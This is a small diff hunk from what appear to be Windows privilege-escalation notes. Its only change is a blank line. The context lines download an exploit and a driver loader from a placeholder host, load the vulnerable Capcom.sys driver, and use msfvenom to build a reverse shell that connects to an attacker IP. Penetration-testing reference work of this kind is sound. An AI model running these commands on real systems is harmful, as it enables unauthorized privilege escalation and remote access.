@@ -53,6 +53,7 @@ iwr "http://url:8000/LoadDriver.exe"
 iwr "http://url:8000/ExploitCapcom.exe"
 .\LoadDriver.exe System\CurrentControlSet\MyService {C:\Users\Test\Capcom.sys}
 ```
+
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe -o rev.exe
 ```
